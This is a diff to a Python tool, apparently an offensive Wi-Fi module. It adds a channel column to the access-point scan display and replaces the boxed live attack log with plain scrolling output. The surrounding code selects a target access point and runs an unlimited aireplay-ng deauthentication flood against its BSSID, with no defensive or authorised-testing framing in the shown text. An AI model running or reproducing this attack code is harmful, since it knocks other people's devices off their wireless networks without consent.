@@ -133,8 +133,8 @@ def _render_scan_screen(elapsed, tick, prev_lines):
         f"{spin}  {bar}",
         f"{remaining:>2}s left  ·  {len(active_wireless_network)} access point(s) found",
         "",
-        f"{'essid':<24}{'bssid':<20}{'speed'}",
-        f"{'-----':<24}{'-----':<20}{'-----'}",
+        f"{'essid':<24}{'bssid':<20}{'ch':<5}{'speed'}",
+        f"{'-----':<24}{'-----':<20}{'--':<5}{'-----'}",
     ]
     for item in active_wireless_network:
         speed = (item.get("Speed") or "").strip()
@@ -142,7 +142,8 @@ def _render_scan_screen(elapsed, tick, prev_lines):
         essid = (item["ESSID"] or "").strip()
         if len(essid) > 22:
             essid = essid[:21] + "…"
-        lines.append(f"{essid:<24}{item['BSSID']:<20}{speed_display}")
+        channel = (item.get("channel") or "").strip()
+        lines.append(f"{essid:<24}{item['BSSID']:<20}{channel:<5}{speed_display}")
     if not active_wireless_network:
         lines.append(f"{banner.C.MUTED}no access points found yet...{banner.C.RESET}")
     lines.append("")
@@ -262,34 +263,6 @@ def select_target(mon_interface):
             banner.warn("invalid selection, try again")
 
 
-ATTACK_LOG_LINES = 12  # how many recent aireplay-ng lines stay visible in the box
-
-
-def _render_attack_screen(tick, target, log_lines, prev_lines):
-    # rewind only the box's own line count instead of re-clearing the whole
-    # screen and reprinting the big logo/links block on every new log line
-    banner.rewind(prev_lines)
-
-    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
-
-    lines = [
-        f"target essid : {target['ESSID']}",
-        f"target bssid : {target['BSSID']}",
-        f"channel      : {target['channel'].strip()}",
-        "",
-        f"{spin}  sending deauth frames...",
-        "",
-    ]
-    if log_lines:
-        lines.extend(log_lines)
-    else:
-        lines.append(f"{banner.C.MUTED}waiting for aireplay-ng output...{banner.C.RESET}")
-    lines.append("")
-    lines.append(f"{banner.C.MUTED}press ctrl+c to stop{banner.C.RESET}")
-
-    return banner.box(lines, title="aireplay-ng log", accent=banner.C.CYAN)
-
-
 def launch_attack(mon_interface, target):
     banner.module_banner("wifi")
     banner.section("launching deauthentication attack", accent=banner.C.CYAN)
@@ -308,12 +281,19 @@ def launch_attack(mon_interface, target):
 
     banner.module_banner("wifi")
     banner.section("deauthentication attack running", accent=banner.C.CYAN)
-    prev_lines = 0
+    print(f"  target essid  : {target['ESSID']}")
+    print(f"  target bssid  : {bssid}")
+    print(f"  channel       : {channel}")
+    print()
+    banner.info("sending deauth frames... (press ctrl+c to stop)")
+    print()
 
     # give aireplay-ng a real pty instead of a plain pipe for its output —
     # a plain pipe makes it detect a non-terminal and switch to full block
-    # buffering, which delays the boxed live log by several seconds; a pty
-    # keeps it thinking it's talking to a terminal, so it stays line-buffered
+    # buffering, which delays the log by several seconds; a pty keeps it
+    # thinking it's talking to a terminal, so it stays line-buffered. the
+    # log itself just prints and scrolls plainly — no boxed live redraw,
+    # since redrawing a growing box turned out unreliable on real terminals
     master_fd, slave_fd = pty.openpty()
     attack_proc = subprocess.Popen(
         ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
@@ -323,8 +303,6 @@ def launch_attack(mon_interface, target):
     )
     os.close(slave_fd)
 
-    log_lines = []
-    tick = 0
     buf = ""
     try:
         while True:
@@ -340,11 +318,7 @@ def launch_attack(mon_interface, target):
             for line in complete_lines:
                 line = line.strip()
                 if line:
-                    log_lines.append(line)
-                    del log_lines[:-ATTACK_LOG_LINES]
-
-            prev_lines = _render_attack_screen(tick, target, log_lines, prev_lines)
-            tick += 1
+                    print(f"  {banner.C.MUTED}{line}{banner.C.RESET}")
     except KeyboardInterrupt:
         pass
     finally:
